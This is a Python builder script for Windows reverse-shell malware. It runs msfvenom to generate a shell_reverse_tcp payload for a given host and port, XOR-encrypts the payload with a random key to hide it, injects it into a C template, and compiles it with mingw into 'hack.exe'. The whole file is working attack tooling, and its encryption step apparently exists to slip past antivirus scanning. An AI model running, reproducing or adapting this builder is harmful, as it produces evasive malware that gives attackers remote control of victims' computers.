# payload encryption functions
import argparse
import subprocess
import sys
import random
import os
import hashlib
import string

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def random_key():
    length = random.randint(16, 32)
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))

    return output_str

def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
    return ciphertext, key

def generate_payload(host, port):
    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
    msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
    msfv += " LHOST=" + host
    msfv += " LPORT=" + port
    msfv += " -f raw"
    msfv += " -o /tmp/hack.bin"
    print (Colors.YELLOW + msfv + Colors.ENDC)
    try:
        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
        p.wait()
        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
    except Exception as e:
        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
        sys.exit()

def run(host, port):
    print (Colors.BLUE + "run..." + Colors.ENDC)
    generate_payload(host, port)
    print (Colors.BLUE + "read payload..." + Colors.ENDC)
    plaintext = open("/tmp/hack.bin", "rb").read()
    print (Colors.BLUE + "build..." + Colors.ENDC)
    print (Colors.BLUE + "encrypt..." + Colors.ENDC)
    ciphertext, payload_key = xor_encrypt(plaintext, random_key())

    tmp = open("temp.c", "rt")
    data = tmp.read()

    data = data.replace('unsigned char encryptedPayload[] = { };', 'unsigned char encryptedPayload[] = ' + ciphertext)
    data = data.replace('char decryptionKey[] = "";', 'char decryptionKey[] = "' + payload_key + '";')

    tmp.close()
    tmp = open("temp-enc.c", "w+")
    tmp.write(data)
    tmp.close()
    print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
    print (Colors.BLUE + "compiling..." + Colors.ENDC)
    try:
        cmd = "x86_64-w64-mingw32-g++ -O2 temp-enc.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
        os.system(cmd)
    except:
        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
        sys.exit()
    else:
        print (Colors.YELLOW + cmd + Colors.ENDC)
        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost', required = True, help = "local IP")
    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    run(host, port)
